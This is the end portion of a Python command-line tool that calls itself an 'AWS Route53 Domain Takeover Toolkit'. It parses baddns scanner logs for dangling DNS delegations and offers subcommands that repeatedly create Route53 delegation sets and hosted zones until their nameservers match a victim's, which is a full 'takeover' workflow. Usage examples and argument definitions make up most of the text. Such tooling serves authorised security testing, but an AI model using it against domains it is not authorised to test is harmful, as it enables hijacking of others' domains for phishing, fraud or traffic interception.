            print(f"    - {t}")
        print()

    # Export if requested
    if args.output:
        output_path = Path(args.output)
        with open(output_path, "w") as f:
            json.dump(
                {
                    "ns_groups": {k: v for k, v in ns_groups.items()},
                    "total_targets": len(entries),
                    "entries": entries,
                },
                f,
                indent=2,
            )
        logger.info("Exported analysis to %s", output_path)

    # Export target NS file for use with hunt commands
    if args.export_targets:
        export_path = Path(args.export_targets)
        all_ns = set()
        for entry in entries:
            all_ns.update(entry["nameservers"])
        with open(export_path, "w") as f:
            f.write("# Target nameservers extracted from baddns log\n")
            f.write(f"# Source: {log_file.name}\n")
            f.write(f"# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for ns in sorted(all_ns):
                f.write(f"{ns}\n")
        logger.info("Exported %d unique nameservers to %s", len(all_ns), export_path)


# ─────────────────────────────────────────────────────────────────────
# CLI Argument Parser
# ─────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="aws-domain-takeover",
        description="AWS Route53 Domain Takeover Toolkit - Hunt for dangling DNS delegations",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Find a matching delegation set (no zone creation)
  python aws-domain-takeover.py --sub-command hunt-delegation-set \\
      --target-ns "ns-112.awsdns-14.com. ns-999.awsdns-60.net."

  # Full auto-takeover from baddns log (recommended)
  python aws-domain-takeover.py --sub-command takeover \\
      --parse-ns-from scan.baddns.log

  # Takeover with manual NS + zone name
  python aws-domain-takeover.py --sub-command takeover \\
      --target-ns "ns-112.awsdns-14.com. ns-999.awsdns-60.net." \\
      --zone-name example.com

  # Hunt using hosted zones with NS from file
  python aws-domain-takeover.py --sub-command hunt-zone \\
      --zone-name example.com --target-ns-file targets.txt

  # Parse baddns output and export targets
  python aws-domain-takeover.py --sub-command parse-baddns \\
      --file scan.log --export-targets targets.txt

  # Delete all delegation sets
  python aws-domain-takeover.py --sub-command delete-sets --force

  # Positional subcommand syntax also works:
  python aws-domain-takeover.py takeover --parse-ns-from scan.baddns.log
""",
    )

    # Global arguments
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose/debug logging")
    parser.add_argument("--log-file", type=str, help="Write logs to file")
    parser.add_argument("--profile", type=str, help="AWS profile name to use")

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # ── hunt-delegation-set ──────────────────────────────────────────
    p_hunt_ds = subparsers.add_parser(
        "hunt-delegation-set",
        help="Find the first delegation set matching target NS (no zone creation)",
        description="Create reusable delegation sets until one matches target nameservers. "
                    "Keeps the matched set and stops. Use 'takeover' for zone creation.",
    )
    p_hunt_ds.add_argument("--target-ns", type=str, help='Target NS in quotes: "ns-1.awsdns-01.com. ns-2.awsdns-02.net."')
    p_hunt_ds.add_argument("--target-ns-file", type=str, help="File containing target NS (one per line)")
    p_hunt_ds.add_argument("--parse-ns-from", type=str, help="Extract AWS NS from any file (e.g. baddns log). Overwrites --target-ns/--target-ns-file")
    p_hunt_ds.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS, help=f"Max attempts (default: {DEFAULT_MAX_ATTEMPTS})")
    p_hunt_ds.add_argument("--sleep", type=float, default=DEFAULT_SLEEP, help=f"Sleep between attempts in seconds (default: {DEFAULT_SLEEP})")
    p_hunt_ds.add_argument("--stats-file", type=str, help="Statistics file path (default: delegation_set_statistics.json)")
    p_hunt_ds.add_argument("--dry-run", action="store_true", help="Preview actions without creating resources")
    p_hunt_ds.set_defaults(func=cmd_hunt_delegation_set)

    # ── takeover ─────────────────────────────────────────────────────
    p_takeover = subparsers.add_parser(
        "takeover",
        help="Full 6-step workflow: hunt delegation set + create zone + cleanup",
        description="Hunt for a matching delegation set and automatically create a hosted zone "
                    "on match.  Supports baddns log auto-detection or manual --zone-name.",
    )
    p_takeover.add_argument("--target-ns", type=str, help='Target NS in quotes: "ns-1.awsdns-01.com. ns-2.awsdns-02.net."')
    p_takeover.add_argument("--target-ns-file", type=str, help="File containing target NS (one per line)")
    p_takeover.add_argument("--parse-ns-from", type=str, help="Extract AWS NS from baddns log (auto-detects target domains)")
    p_takeover.add_argument("--zone-name", type=str, help="Override zone name (normally auto-resolved from baddns log per entry)")
    p_takeover.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS, help=f"Max attempts (default: {DEFAULT_MAX_ATTEMPTS})")
    p_takeover.add_argument("--sleep", type=float, default=DEFAULT_SLEEP, help=f"Sleep between attempts in seconds (default: {DEFAULT_SLEEP})")
    p_takeover.add_argument("--stats-file", type=str, help="Statistics file path (default: delegation_set_statistics.json)")
    p_takeover.add_argument("--dry-run", action="store_true", help="Preview actions without creating resources")
    p_takeover.set_defaults(func=cmd_takeover)

    # ── hunt-zone ────────────────────────────────────────────────────
    p_hunt_zone = subparsers.add_parser(
        "hunt-zone",
        help="Hunt target NS by creating hosted zones",
        description="Create hosted zones for a domain until one matches target nameservers. "
                    "Note: hosted zones cost $0.50 each.",
    )
    p_hunt_zone.add_argument("--zone-name", type=str, required=True, help="Domain name for the hosted zone")
    p_hunt_zone.add_argument("--target-ns", type=str, help='Target NS in quotes: "ns-1.awsdns-01.com. ns-2.awsdns-02.net."')
    p_hunt_zone.add_argument("--target-ns-file", type=str, help="File containing target NS (one per line)")
    p_hunt_zone.add_argument("--parse-ns-from", type=str, help="Extract AWS NS from any file (e.g. baddns log). Overwrites --target-ns/--target-ns-file")
    p_hunt_zone.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS, help=f"Max attempts (default: {DEFAULT_MAX_ATTEMPTS})")
    p_hunt_zone.add_argument("--sleep", type=float, default=DEFAULT_SLEEP, help=f"Sleep between attempts in seconds (default: {DEFAULT_SLEEP})")
    p_hunt_zone.add_argument("--stats-file", type=str, help="Statistics file path (default: ns_statistics.json)")
    p_hunt_zone.add_argument("--dry-run", action="store_true", help="Preview actions without creating resources")
    p_hunt_zone.set_defaults(func=cmd_hunt_zone)

    # ── delete-sets ──────────────────────────────────────────────────
    p_delete = subparsers.add_parser(
        "delete-sets",
        help="Delete all reusable delegation sets",
        description="List and delete all reusable delegation sets in the AWS account.",
    )
    p_delete.add_argument("--force", "-f", action="store_true", help="Skip confirmation prompt")
    p_delete.add_argument("--dry-run", action="store_true", help="List sets without deleting")
    p_delete.set_defaults(func=cmd_delete_sets)

    # ── parse-baddns ─────────────────────────────────────────────────
    p_baddns = subparsers.add_parser(
        "parse-baddns",
        help="Parse baddns log output for dangling NS targets",
        description="Parse baddns scanner output to extract vulnerable domains and their nameservers.",
    )
    p_baddns.add_argument("--file", "-f", type=str, required=True, help="Path to baddns log file")
    p_baddns.add_argument("--all", action="store_true", help="Include non-AWS targets (Azure, etc.)")
    p_baddns.add_argument("--output", "-o", type=str, help="Export full analysis to JSON file")
    p_baddns.add_argument("--export-targets", type=str, help="Export unique NS to a target file for use with hunt commands")
    p_baddns.set_defaults(func=cmd_parse_baddns)

    return parser


# ─────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────

def main():
    # Support --sub-command as an alternative to positional subcommands.
    # Converts  --sub-command <name>  →  <name>  in argv before parsing.
    argv = sys.argv[1:]
    if "--sub-command" in argv:
        idx = argv.index("--sub-command")
        if idx + 1 < len(argv):
            cmd = argv[idx + 1]
            argv = argv[:idx] + [cmd] + argv[idx + 2:]
        else:
            print("Error: --sub-command requires a value", file=sys.stderr)
            sys.exit(1)

    parser = build_parser()
    args = parser.parse_args(argv)

    setup_logging(verbose=args.verbose, log_file=args.log_file)

    if not args.command:
        parser.print_help()
        sys.exit(0)

    args.func(args)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n  Interrupted by user.", "yellow"))
        sys.exit(1)
    except SystemExit:
        raise
    except Exception as e:
        logger.error("Fatal error: %s", e, exc_info=True)
        sys.exit(1)
